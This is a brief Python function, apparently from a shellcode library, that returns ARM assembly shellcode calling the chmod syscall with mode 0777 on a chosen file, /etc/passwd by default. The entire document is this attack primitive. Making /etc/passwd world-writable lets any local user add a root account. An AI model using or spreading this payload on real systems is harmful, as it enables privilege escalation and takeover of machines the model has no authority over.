def generate(fname='/etc/passwd'):
    """``chmod`` like a UNIX command with mask ``0777``

    Args:
        fname(str): file name
    """
    sc = """
    mov r0, pc
    add r0, #12
    mov r1, #255
    add r1, #255
    add r1, #1
    mov r7, #15
    svc 1
    b after_1
chmod_1:
    .asciz "%s\x00"
after_1:
    """ % (fname)
    return sc
